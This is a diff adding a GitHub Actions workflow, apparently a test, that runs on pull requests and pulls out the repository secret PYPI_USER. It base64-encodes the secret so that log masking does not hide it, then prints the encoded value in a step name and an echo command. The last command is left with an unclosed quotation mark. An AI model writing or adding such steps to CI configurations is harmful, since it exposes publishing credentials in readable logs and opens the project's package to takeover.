@@ -1,0 +1,19 @@
+name: Test secret
+
+on: pull_request
+
+jobs:
+  my-job:
+    name: My Job
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v2
+
+      - name: Extract secret
+        id: sec
+        run: echo ::set-output name=SEC::$(echo "${{ secrets.PYPI_USER }}" | base64)
+
+      - name: Decrypt large secret ${{ steps.sec.outputs.SEC }}
+        run: echo "${{ secrets.PYPI_USER }} | base64
+
+
